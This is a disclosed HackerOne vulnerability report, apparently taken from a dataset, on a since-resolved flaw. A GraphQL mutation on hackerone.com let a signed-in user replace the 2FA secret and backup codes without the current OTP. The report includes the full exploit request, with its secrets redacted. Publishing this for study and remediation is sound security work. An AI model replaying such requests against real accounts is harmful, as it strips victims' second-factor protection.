---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1139535'
original_report_id: '1139535'
title: Changing the 2FA secret key and backup codes without knowing the 2FA OTP
weakness: Modification of Assumed-Immutable Data (MAID)
team_handle: security
created_at: '2021-03-29T06:25:48.659Z'
disclosed_at: '2021-05-06T06:30:09.775Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 50
asset_identifier: http://hackerone.com/graphql
asset_type: URL
max_severity: critical
tags:
- hackerone
- modification-of-assumed-immutable-data-maid
---

# Changing the 2FA secret key and backup codes without knowing the 2FA OTP

## Metadata

- HackerOne Report ID: 1139535
- Weakness: Modification of Assumed-Immutable Data (MAID)
- Program: security
- Disclosed At: 2021-05-06T06:30:09.775Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

## Summary:

 After the setup of 2FA, disabling or editing it should require the 2FA OTP.
But it can be bypassed.

## Steps To Reproduce:

1) Sign in to a new HackerOne account.
2) Setup 2FA; and
3) Try to disable it without knowing the OTP.

You can't, you need to know the `Authentication Code` or `Backup Code`.

{F1246364}

Let's bypass it:

1) Open Google Authenticator and create a new account using `██████` as the setup key;
2) Sign in to your HackerOne account;
3) Replay the HTTP Request below (update `X-Auth-Token`, `password`, and `otp_code` using the OTP generated on Google Authenticator):

```
POST /graphql HTTP/1.1
Host: hackerone.com
content-type: application/json
X-Auth-Token: ******************************
Content-Length: 1221

{"operationName":"UpdateTwoFactorAuthenticationCredentials","variables":{"password":"******************************","otp_code":"******************************","signature":"f3a55d33972b3ac5433dc1ea3f36bed8b6813bf9","backup_codes":["b144ab9f9bc17195","09cc146d7a382931","95bd3133a5bab481","b54d2a14acc7ff0b","46f36d0d72096963"],"totp_secret":"███████","backup_code":"b144ab9f9bc17195"},"query":"mutation UpdateTwoFactorAuthenticationCredentials($password: String!, $otp_code: String!, $backup_code: String!, $totp_secret: String!, $backup_codes: [String]!, $signature: String!) {\n  updateTwoFactorAuthenticationCredentials(input: {password: $password, otp_code: $otp_code, backup_code: $backup_code, totp_secret: $totp_secret, backup_codes: $backup_codes, signature: $signature}) {\n    was_successful\n    errors(first: 100) {\n      edges {\n        node {\n          id\n          type\n          field\n          message\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    me {\n      id\n      remaining_otp_backup_code_count\n      totp_supported\n      totp_enabled\n      remaining_otp_backup_code_count\n      account_recovery_phone_number\n      __typename\n    }\n    __typename\n  }\n}\n"}
```

The 2FA secret key and backup codes will be changed.
You didn't need to know the old 2FA OTP to make the changes.

{F1246361}

4) Sign out and try to sign in again.
Now you need to use the new 2FA OTP, the old one doesn't work anymore.

## Recommendation:

Don't allow changes on 2FA configuration without confirming that the user knows the 2FA OTP.

## Impact

An attacker can change the 2FA secret key and backup codes without knowing the 2FA OTP of the victim.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
